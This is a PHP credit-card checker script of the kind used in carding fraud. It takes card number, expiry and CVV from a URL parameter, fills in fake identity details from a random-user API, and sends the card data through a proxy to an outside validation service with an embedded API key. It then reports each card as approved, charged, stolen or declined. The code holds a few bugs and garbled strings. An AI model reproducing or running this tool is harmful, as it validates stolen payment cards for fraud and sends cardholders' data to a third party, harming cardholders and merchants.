<?php






error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('Europe/Zurich');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function rebootproxys()
{
  //$poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt');
}
/*
$crawleraproxy = 'proxy.crawlera.com:8010';
$proxyauth = 'fb04ba68d60945b793bac549f7ae41e9:';
*/
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";}


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

////////////////////////////===[For Authorizing Cards]

/////////========Luminati
////////=========Socks Proxy

/*
$proxies = array();
$proxies [] = '207.229.93.68:1025'; //Some proxies require IP,port no.
$proxies [] = '207.229.93.68:1026';
$proxies [] = '207.229.93.68:1027';
$proxies [] = '207.229.93.68:1028';
$proxies [] = '207.229.93.68:1029';
///if (isset($proxies)) {*/
    ///$proxy = $proxies[array_rand($proxies)];
///}


////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
////////=========Socks Proxy
///if (isset($proxy)) {    // If the $proxy variable is set, then
    ///curl_setopt($ch, CURLOPT_PROXY, $proxy);    // Set CURLOPT_PROXY with proxy in $proxy variable
//}
///curl

echo "<font class='badge badge-secondary'> GATE CVV AUTHORISATION ONLY </font>";

/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api2.validcc.pro/?key=DsVc0Huqn-8NHrlqVFT5-cHJpdmtleQ&cc='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'method: GET',
'Content-Type: text/html',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36'

));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key=DsVc0Huqn-8NHrlqVFT5-cHJpdmtleQ&cc='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');



$result = curl_exec($ch);




////////////////////////////===[Card Response]

if(strpos($result, '"status":"LIVE"')){

  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> </i></font><br> </i> </font><br>";
  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>SUCCESS CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada  <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=3 color='green'><font class='badge badge-success'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=3 color='green'><font class='badge badge-warning'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-warning'>LOST CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=3 color='green'><font class='badge badge-warning'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-warning'>STOLEN CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=3 color='green'><font class='badge badge-light'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-light'>CVV INCORRECT</i></font><br> <font class='badge badge-light'";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=3 color='green'><font class='badge badge-warning'>Aprovada <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='green'><font class='badge badge-warning'>STOLEN OR LOST</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i> </font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=3 color='red'><font class='badge badge-warning'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>DO NOT HONOR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='red'><font class='badge badge-warning'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result, 'Your card was declined.')) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>CARD DECLINED</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada  <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>CVC_CHECKED : Fail</i> </font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>MISSING CARD DETAIL</i> </font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>CARD NOT CHECK</i> </font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>3D SECURED</i> </font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i> </font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i> </font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=3 color='red'><font class='badge badge-warning'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=3 color='red'><font class='badge badge-warning'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
elseif(strpos($result, 'fraudulent')) {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>Fraudulent</i> </font><br>";
} 
else {
  echo "<font size=3 color='red'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=3 color='red'><font class='badge badge-danger'>Server Failure/Error Not Listed</i> </font><br>";
}

curl_close($ch);
///echo $result;
ob_flush();


?>
